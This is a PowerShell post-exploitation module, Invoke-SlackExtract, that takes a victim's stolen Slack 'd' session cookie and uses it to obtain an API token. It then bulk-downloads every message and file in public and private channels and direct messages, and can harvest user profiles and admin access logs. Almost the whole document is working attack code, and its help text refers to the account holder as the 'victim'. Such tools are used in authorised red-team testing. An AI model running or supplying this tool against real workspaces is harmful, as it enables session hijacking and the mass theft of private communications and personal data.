function Invoke-SlackExtract{
 <#
    .SYNOPSIS
    This module will extract all messages and files that a given user has access to in Slack
    Author: Carrie Roberts (@OrOneEqualsOne)
    Version: 1.1
    License: BSD 3-Clause

    .DESCRIPTION
    This module will extract all messages and files that a given user has access to in Slack. Or, optionally specifiy specific channels to download from.

    .PARAMETER OutputFolderName
    [Required] The output folder name to store all messages and files inside of the "My Documents" folder. This is useful for keeping data from multiple users separate, or to keep output from multiple runs of the script separate.

    .PARAMETER SlackUrl
    [Required] The base URL of the slack instance. For example "https://slackextract.slack.com"

    .PARAMETER dCookie
    [Required if SlackToken not specified] The "d" cookie from .slack.com. Login to Slack as your victim user and then extract this cookie value for use with this script.

    .PARAMETER ChannelIds
    [Optional] The Channel IDs that you want to extract messages and files for. Channel IDs generally start with a "C","G" or "D". If you do not specify ChannelIds, the script will download messages and files from ALL channels. You can determine the channel ID by inspecting the URL in the browser (e.g. https://slackextract.slack.com/messages/CC74THDHB/ would have  a channel ID of CC74THDHB) 

    .PARAMETER ExcludeChannelIds
    [Optional] A list of Channel IDs that you do not want to extract messages or files for.

    .PARAMETER MaxMessagesPerChannel
    [Optional] The maximum number of messages to download from each channel. The default is 10,000 and the minimum is 200. It is a good idea to use a reasonable limit because automated bot channels can have an insane amount of uninteresting messages.

    .PARAMETER MaxFilesPerChannel
    [Optional] The maximum number of files to download from each channel. The default is 2,000.

    .PARAMETER ExtractUsers
    [Optional] A command line switch to specify that the script should extract up to MaxUsers user profiles and then exit. No messages or files will be downloaded while this switch is being used. 

    .PARAMETER MaxUsers
    [Optional] The maximum number of user profiles to download. This is useful for extracting usernames, email, job tiles, phone numbers, etc. The default is 100,000. The -ExtractUsers parameter must be specified to download users.

    .PARAMETER PrivateOnly
    [Optional] A command line switch to ignore all public channels (i.e. don't download messages and files for public channels)

    .PARAMETER SlackToken
    [Required if dCookie not Specifed] Manually set the Slack token value instead of fetching it from slack using the dCookie. This will speed up subsequent runs of the script against the same workspace. Slack tokens start with "xoxs-". The token will be printed to the screen when this parameter is not specified.
    
    .PARAMETER OutputDir
    [Optional] The file location to write script output too. The OutputFolderName will be appended to this parameter. The default OutputDir is the "My Documents" directory on Windows.

    .PARAMETER ExtractAccessLogs
    [Optional] A command line switch to specify that the script should extract up to MaxAccessLogs and then exit. No messages or files will be downloaded while this switch is being used. This only works for paid slack workspaces. You also must have access to Slack as an admin for this to work.

    .PARAMETER MaxAccessLogs
    [Optional] The maximum number of user access logs to download. The default is 100,000. The -ExtractAccessLogs parameter must be specified to download users.
   
    .EXAMPLE
    
    C:\PS> Invoke-SlackExtract -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to 2,000 files and up to 10,000 messages from each and every channel the user has access to. 
    The output will be written to the "My Documents" directory in the "SlackExtract\Carrie\" folder
    
    .EXAMPLE
    C:\PS> Invoke-SlackExtract -MaxMessagesPerChannel 200 -MaxFilesPerChannel 50 -ChannelIds C1JLE30R3,GB9TMN61M,DB04V15N0 -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to files 50 and up to 200 messages from only the three Channels specified.
    
    .EXAMPLE
    
    C:\PS> Invoke-SlackExtract -ExtractUsers -SlackUrl https://slackextract.slack.com -OutputFolderName Carrie -dCookie On3pAK1fxrp%2BGrDENnmgdvEg5JwDgf%2BNclR5d2NUY0w1R01EYHFvaVdOUGV2OExDVWdZbGxnVUyFUVl0enFZd0VjTUZIeExabWZFYkJUTDVBWnlRRU84WEQ3YjRyVWUzVnFIOGlFUUhvS3B6ZVZnY1l3Q2xqTEhRSUhRNXhXaFVyaisrc3A5YWNrbWpmaWpVUGt0eTV0YzZsaWYxaVd0L1NKSWQyQ0k9JAizLCi3UrA%2BeYL6uU%2B8Zg%3D%3D

    Description
    -----------
    This command will download up to 100,000 user profiles and then exit. No channel messages or files will be downloaded. 
    You can limit the number of profiles downloaded with the MaxUsers parameter.
    
#>

 Param(

     [Parameter(Mandatory = $true)]
     [string]
     $OutputFolderName,

     [Parameter(Mandatory = $true)]
     [string]
     $SlackUrl,

     [Parameter( Mandatory = $false)]
     [string[]]
     $ChannelIds,

     [Parameter( Mandatory = $false)]
     [string[]]
     $ExcludeChannelIds,

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxMessagesPerChannel = 10000, #Default is 10,000 messages per channel, Minimum is 200 messages per channel

     [Parameter(Mandatory,ParameterSetName='dCookie')]
     [string]
     $dCookie,

     [Parameter(Mandatory = $false)]
     [Int]
     $MaxFilesPerChannel = 2000, #Default is 2,000 files per channel

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxUsers = 100000, #Default is 100,000 user profiles to download, Minimum is 200 users

     [Parameter(Mandatory = $false)]
     [Switch]
     $ExtractUsers = $false,

     [Parameter(Mandatory = $false)]
     [Switch]
     $PrivateOnly = $false,

     [Parameter(Mandatory,ParameterSetName='token')]
     [String]
     $SlackToken,
     
     [Parameter(Mandatory = $false)]
     [String]
     $OutputDir,

     [Parameter(Mandatory = $false)]
     [ValidateRange(200,1000000)]
     [Int]
     $MaxAccessLogs = 100000, #Default is 100,000 access logs to download, Minimum is 200 login events

     [Parameter(Mandatory = $false)]
     [Switch]
     $ExtractAccessLogs = $false
 )

(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
Add-Type -AssemblyName System.Web

$ua = "Mozilla"

$docsDir = [Environment]::GetFolderPath("MyDocuments")
if(-not $outputDir) {$outputDir = Join-Path -Path $docsDir -ChildPath "SlackExtract" | Join-Path -ChildPath $OutputFolderName }
else { $outputDir = Join-Path -Path $outputDir -ChildPath "SlackExtract" | Join-Path -ChildPath $OutputFolderName }
Write-Host -ForegroundColor Green "All output will be written to the $outputDir directory`n" 
$delay = 1 # a delay after every request to slack to avoid rate limiting
$timer = [System.Diagnostics.Stopwatch]::StartNew()

function CreateDirIfNotExists( $dir ){
    if(!(test-path $dir)){ $r = New-Item -ItemType Directory -Path $dir }
}

# create a "meta" folder and subfolder for each channel type
$metaDir = Join-Path -Path $OutputDir -ChildPath "meta"; CreateDirIfNotExists($metaDir)
$channelsMetaDir = Join-Path -Path $metaDir -ChildPath "channels_meta"; CreateDirIfNotExists($channelsMetaDir)
$groupsMetaDir = Join-Path -Path $metaDir -ChildPath "groups_meta"; CreateDirIfNotExists($groupsMetaDir)
$imsMetaDir = Join-Path -Path $metaDir -ChildPath "ims_meta"; CreateDirIfNotExists($imsMetaDir)
$mpimsMetaDir = Join-Path -Path $metaDir -ChildPath "mpims_meta"; CreateDirIfNotExists($mpimsMetaDir)
$usersDir = Join-Path -Path $metaDir -ChildPath "users"; CreateDirIfNotExists($usersDir)
$accessLogsDir = Join-Path -Path $metaDir -ChildPath "access_logs"; CreateDirIfNotExists($accessLogsDir)

#Shazam calls an endpoint for 200 results at a time and keeps making calls until there are no more results or until $limit is reached.
function Shazam($apiEndpoint, $requestBody, $type, $limit, $folder){
    $messagesCount = 0
	do {
		$gotOK = $false
		$autoRetries = 5
		$count = 0
		$exception = $false
        $followCursor = $false
		
        while (!$gotOK)
		{
    	    try
            {

                $responseConversationsHistory = Invoke-RestMethod -Uri "$SlackUrl/api/$apiEndpoint" -Method Post -Body $requestBody -UserAgent $ua -TimeoutSec 600; sleep($delay) 

				$exception = $false
			}
			catch [System.Exception]
			{
				$exception = $true
			}

			if($exception -or !($responseConversationsHistory.ok)) {
                Write-Host -ForegroundColor Red "Problem $apiEndpoint $type : $($responseConversationsHistory.error)"
                foreach($e in $responseConversationsHistory) {
				    Write-Host -ForegroundColor Red $e 
                }
				if($count -lt $autoRetries) {
					$sleepTime = 10
					Write-Host -ForegroundColor Yellow  "Auto-Retrying in $($sleepTime * $count) seconds"
					sleep($sleepTime * $count)

				}
				else{ Read-Host -Prompt "Press Enter to continue"}
			} 
			else {$gotOK = $true}
			$count = $count + 1
		}
        $collection = $responseConversationsHistory.messages

        if($type -eq "user"){ 
            $collection = $responseConversationsHistory.members 
        }
        elseif($type -eq "login"){ 
            $collection = $responseConversationsHistory.logins 
        }
        elseif($type -ne "message"){ 
            if($responseConversationsHistory.channels){
                $collection = $responseConversationsHistory.channels 
            }
            else {
                $collection = $responseConversationsHistory.channel
            }
        }
		foreach ($message in $collection)
		{
			$messagesCount = $messagesCount + 1
            $name=$message.id 
            if($type -eq "login"){ $name = "$($message.date_last)-$($message.user_id)" }
            elseif($type -eq "message"){ $name = $message.ts}
			$fn = Join-Path -Path $folder -ChildPath "$name.json"
			if(!(test-path $fn)){
				$message | ConvertTo-Json | Out-File $fn
			}
			else {
				if($type -ne "message"){Write-Host -ForegroundColor Yellow "Skipping already existing file: $fn"}
			}
		}
        if($responseConversationsHistory.response_metadata -and $responseConversationsHistory.response_metadata.next_cursor){
            $followCursor = $true
            $requestBody.remove("cursor")
		    $requestBody.Add("cursor",$responseConversationsHistory.response_metadata.next_cursor) 
        }
        elseif($responseConversationsHistory.paging -and ($responseConversationsHistory.paging.page -lt $responseConversationsHistory.paging.pages)){
            $followCursor = $true
            $requestBody.remove("page")
		    $requestBody.Add("page",$responseConversationsHistory.paging.page + 1) 
        }
	} while ($followCursor -and ($messagesCount -lt $limit ))

    return $messagesCount
}


function getChannelsMeta($type)
{
    Write-Host -ForegroundColor Cyan "Getting $type`s meta data"
    $cDir = $channelsMetaDir
    if($type -eq "private_channel") { $cDir = $groupsMetaDir }
    if($type -eq "im") {  $cDir = $imsMetaDir }
    if($type -eq "mpim") { $cDir = $mpimsMetaDir }

    # If specific channel IDs were specified, only download those channel details
    if($ChannelIds) { 
		foreach ($channel in $ChannelIds){
            $requestBody = @{token=$SlackToken; channel=$channel}
            $messagesCount = Shazam "conversations.info" $requestBody $type 100000000 $cDir
		}
    }
    else { # Don't download all the channels if specific group or channel IDs were specified
        $requestBody = @{token=$SlackToken; exclude_members='true'; types=$type; limit=200}
        $messagesCount = Shazam "conversations.list" $requestBody $type 100000000 $cDir
    }
}

function metaToCSV ($dir, $users = $false)
{
	Write-Host -ForegroundColor Cyan "Converting metadata to CSV for easy viewing in Excel, look here:`n$dir"
    $name="all_channels.csv"; if($users) { $name = "all_users.csv" }
    $channels = New-Object System.Collections.ArrayList
	foreach($file in (Get-ChildItem $dir -Filter *.json).fullname)
	{
		$channel = (gc $file -Raw | ConvertFrom-Json)
        if($users){
		    $id = $channels.add($channel.profile) 
        }
        else {
		    $id = $channels.add($channel) 
        }
	}
	$channels | ConvertTo-CSV -NoTypeInformation -Delimiter `t | Out-File (Join-Path -Path $dir -ChildPath $name)
}

function getFilesMetaForChannels($channelsOrGroupsMetaDir) 
{
    foreach($channelFile in (Get-ChildItem $channelsOrGroupsMetaDir -Filter *.json).fullname)
	{
        $count = 0
        $limit = 200
        $quit = $false
        if($MaxFilesPerChannel -lt $limit) { $limit = $MaxFilesPerChannel }
		$channel = (gc $channelFile -Raw | ConvertFrom-Json)
		 
        if($ExcludeChannelIds -contains $channel.id){ continue }
	
	    $bodyFilesList = @{token=$SlackToken; count=$limit; channel=$channel.id} 
	    do {
            $filesList = Invoke-RestMethod -Uri "$SlackUrl/api/files.list" -Method Post -Body $bodyFilesList -UserAgent $ua; sleep($delay)


		    Foreach ($file in $filesList.files)
		    {
			    # write the file details as a json message to the filesDir
			    $file | ConvertTo-Json | Out-File (Join-Path -Path $outputDir -ChildPath $channel.id | Join-Path -ChildPath "files" | Join-Path -ChildPath "meta" | Join-Path -ChildPath "$($file.timestamp)-$($file.id).json")
                $count = $count + 1
                if($count -ge $MaxFilesPerChannel) { $quit = $true; break } 
		    } 
		    $bodyFilesList = @{token=$SlackToken; count=$limit; channel=$channel.id; page=$filesList.paging.page+1}
	    } while ((-not $quit) -and ($filesList.paging.page+1 -le $filesList.paging.pages))
    }
}

function getFilesMeta {
    if(-Not $PrivateOnly){
        Write-Host -ForegroundColor Cyan "Getting files metadata for public channels"
        getFilesMetaForChannels($channelsMetaDir)
    }
    Write-Host -ForegroundColor Cyan "Getting files metadata for private channels"
    getFilesMetaForChannels($groupsMetaDir)
    Write-Host -ForegroundColor Cyan "Getting files metadata for IMs"
    getFilesMetaForChannels($imsMetaDir)
    Write-Host -ForegroundColor Cyan "Getting files metadata for Multi-Party IMs"
    getFilesMetaForChannels($mpimsMetaDir)
}

function getMessages($dir)
{
    Write-Host -ForegroundColor Cyan "Getting Messages for each channel (max messages per channel: $maxMessagesPerChannel), $dir"
	
	foreach($groupFile in (Get-ChildItem $dir -Filter *.json).fullname)
	{

		$group = (gc $groupFile -Raw | ConvertFrom-Json)
		$skip = $false
        if($ExcludeChannelIds -contains $group.id){ continue }
        $donePath = Join-Path $dir -ChildPath "done_getting_messages_for.txt"
        if(Test-Path $donePath)
        {
		    foreach($dg in (gc $donePath)) # temporary short circuit because we already have this channel done
		    {
			    if(($group.id -eq $dg)) {$skip = $true; Write-Host -ForegroundColor Yellow "Skipping message download for $($group.id). Remove this file to force re-download: $donePath"; continue} 
		    }
        }
		if($skip){continue}

		Write-Host -ForegroundColor Cyan "Getting messages for $($group.id)"
		# create output folder for each channel with a "files" and "messages" folder inside
		$channelDir = Join-Path -Path $OutputDir -ChildPath $group.id; CreateDirIfNotExists($channelDir)
		$filesDir = Join-Path -Path $channelDir -ChildPath "files"; CreateDirIfNotExists($filesDir)
		$filesMetaDir = Join-Path -Path $filesDir -ChildPath "meta"; CreateDirIfNotExists($filesMetaDir)
		$messagesDir = Join-Path -Path $channelDir -ChildPath "messages"; CreateDirIfNotExists($messagesDir)

		# get all the messages
        $body = @{token=$SlackToken; channel = $group.id; limit=200} 
        $messagesCount = Shazam "conversations.history" $body "message" $maxMessagesPerChannel $messagesDir

		Write-Host -ForegroundColor Cyan "Done getting messages for $($group.id), total messages $messagesCount"
		Add-Content (Join-Path $dir -ChildPath "done_getting_messages_for.txt") "$($group.id)"
    }
}

function getUsers{
    Write-Host -ForegroundColor Cyan "Getting all user details, see $usersDir"
    $body = @{token=$SlackToken; limit=200} 
    $messagesCount = Shazam "users.list" $body "user" $MaxUsers $usersDir
}

function getAccessLogs{
    $body = @{token=$SlackToken; count=200} 
    $messagesCount = Shazam "team.accessLogs" $body "login" $MaxAccessLogs $accessLogsDir
}

function getFilesforChannelOrGroup($channelOrGroupDir){
	foreach($channelFile in (Get-ChildItem $channelOrGroupDir -Filter *.json).fullname)
	{
        $filesCount = 0
		$channel = (gc $channelFile -Raw | ConvertFrom-Json)
        $dirMinusMeta = Join-Path -Path $outputDir -ChildPath $channel.id | Join-Path -ChildPath "files" 
        $dir = Join-Path -Path $dirMinusMeta -ChildPath "meta"
        if(!(test-path $dir)) { continue }
    	foreach($fileF in (Get-ChildItem $dir -Filter *.json).fullname)
		{
			$file = (gc $fileF -Raw | ConvertFrom-Json)


			$fileUrl = $file.url_private_download
			$fileName = Join-Path -Path $dirMinusMeta -ChildPath $($file.id + "_" + $fileUrl.Substring($fileUrl.LastIndexOf("/") + 1))
			if(test-path $fileName){ Write-Host "Skipping already existing file $fileName"}
			else
			{
				Write-Host "Downloading $fileName"

				$response = Invoke-WebRequest -Uri $fileUrl -Headers $headers -UserAgent $ua -OutFile $fileName

			}
            $filesCount = $filesCount + 1
            if ($filesCount -ge $MaxFilesPerChannel) {  Write-Host -ForegroundColor Yellow "Short circuiting file download, $MaxFilesPerChannel files downloaded. Increase MaxFilesPerChannel parameter to download more files";  break }
		} 
    }
}

function getSession{

    #Manually set the session cookie
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $cookie = New-Object System.Net.Cookie 
    $cookie.Name = "d"
    $cookie.Value = $dCookie
    $cookie.Domain = ".slack.com"
    $session.Cookies.Add($cookie);

    $session
}

function getFiles
{

    if(-Not $PrivateOnly){
        Write-Host -ForegroundColor Cyan "Getting files for each public channel"
        getFilesforChannelOrGroup($channelsMetaDir)
    }

    Write-Host -ForegroundColor Cyan "Getting files for each private channel"
    getFilesforChannelOrGroup($groupsMetaDir)

    Write-Host -ForegroundColor Cyan "Getting files for each IM"
    getFilesforChannelOrGroup($imsMetaDir)

    Write-Host -ForegroundColor Cyan "Getting files for each Multi-Party IM (mpim)"
    getFilesforChannelOrGroup($mpimsMetaDir)
}

function getSlackToken {
    Write-Host -ForegroundColor Cyan "Getting Slack Token"
    $session = getSession
    $response = Invoke-WebRequest -Uri "$SlackUrl/messages" -WebSession $session -UserAgent $ua



    if($response.toString() -match 'api_token.*?(xox[csxbp]-[0-9\-a-fA-F]*)' ){
        Write-Host -ForegroundColor Cyan $matches[1]
        return $matches[1]
    }
    #if you get to here, then the slack token was not found
    Write-Host -ForegroundColor Red "!!Unable to extract the slack token using the given cookie, please check that your dCookie value is valid."
    break
}

function SmashJson($folder,$outFileName){
    $batchSize = 1000
    $outFile = Join-Path $folder $outFileName
    if(test-path $outFile){ Remove-Item $outFile}
    $files = Get-ChildItem -path $folder -recurse |?{ ! $_.PSIsContainer } |?{$_.extension -eq ".json"} 
    "[" | Out-File -filepath $outFile -Append
    $count = 0
    $counter = 0
    $batchResult = New-Object System.Collections.ArrayList
    foreach($file in $files){
        $content = [System.IO.File]::ReadAllText($file.FullName)
        $ignore = $batchResult.Add($content)
        $counter = $counter + 1
        $count = $count + 1
        if($count -eq $files.Length -or $counter -eq $batchSize){
            $batchResult -join "," | Out-File -filepath $outFile -Append
            if($count -eq $files.Length){ break}
            "," | Out-File -filepath $outFile -Append
            $counter = 0
            $batchResult.Clear()
         }        
     }
    "]" | Out-File -filepath $outFile -Append
}

#Get the slack api token pragmatically if it wasn't provided by the user as a parameter
if(-not $SlackToken){
    $SlackToken = getSlackToken
}


$headers = @{}
$headers.Add("Authorization", "Bearer " + $SlackToken)

if($ExtractUsers){ 
    Write-Host -ForegroundColor Cyan "Extracting up to $MaxUsers profiles from this workspace."
    getUsers
    metaToCSV $usersDir $true
    Write-Host -ForegroundColor Green "`nDONE! Remove the -ExtractUsers flag to download messages and files."
    break 
}

if($ExtractAccessLogs){ 
    Write-Host -ForegroundColor Cyan "Extracting up to $MaxAccessLogs access logs from this workspace. See $accessLogsDir"
    getAccessLogs
    $file = "accesslogs.json"
    Write-Host -ForegroundColor Cyan "Done extracting individual logs. Now concatenating all logs into single $file file."
    SmashJson $accessLogsDir $file
    Write-Host -ForegroundColor Green "`nDONE! Access logs are stored at $accessLogsDir. Remove the -ExtractAccessLogs flag to download messages and files."
    break 
}

if(-Not $PrivateOnly){
    getChannelsMeta("public_channel")
    metaToCSV($channelsMetaDir)
    getMessages($channelsMetaDir)
}

getChannelsMeta("private_channel")
metaToCSV($groupsMetaDir)
getMessages($groupsMetaDir)

getChannelsMeta("im")
metaToCSV($imsMetaDir)
getMessages($imsMetaDir)

getChannelsMeta("mpim")
metaToCSV($mpimsMetaDir)
getMessages($mpimsMetaDir)

getFilesMeta
getFiles


$CurrentTime = $timer.Elapsed
write-host -ForegroundColor Green $([string]::Format("`nDONE! Run Time: {0:d2}:{1:d2}:{2:d2}",
        $CurrentTime.hours, 
        $CurrentTime.minutes, 
        $CurrentTime.seconds)) -nonewline

}
